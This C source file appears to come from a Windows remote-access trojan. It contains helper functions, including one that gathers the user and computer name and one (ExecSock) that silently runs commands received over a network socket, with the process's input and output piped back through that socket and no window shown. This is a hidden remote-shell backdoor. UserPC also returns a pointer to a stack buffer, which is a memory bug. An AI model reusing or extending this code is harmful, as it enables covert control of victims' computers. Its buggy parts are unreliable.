
/*
Author: Fahad (QuantumCore)
sys.c (c) 2020
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/

#include "fhdawn.h"
// This may be useful somewhere
BOOL isFile(const char* file)
{
	DWORD dwAttrib = GetFileAttributes(file);

	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

// TODO : Add Error handlng
char* UserPC()
{
	char username[UNLEN + 1];
	char hostname[MAX_COMPUTERNAME_LENGTH + 1];
	char output[500];
	memset(output, 0, 500);
	DWORD len = UNLEN + 1;
	DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
	GetUserNameA(username, &len);
	GetComputerNameA(hostname, &hlen);
	snprintf(output, 500, "%s / %s", username, hostname);
	return output;
}


void ExecSock(void)
{
    STARTUPINFO sinfo;
	PROCESS_INFORMATION pinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) sockfd;
	if(CreateProcess(NULL, (LPSTR)recvbuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)){
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
	}
}


char* cDir()
{
	static char DIR[MAX_PATH];
	memset(DIR, '\0', MAX_PATH);
	GetCurrentDirectory(MAX_PATH, DIR);
	return (char*)DIR;
}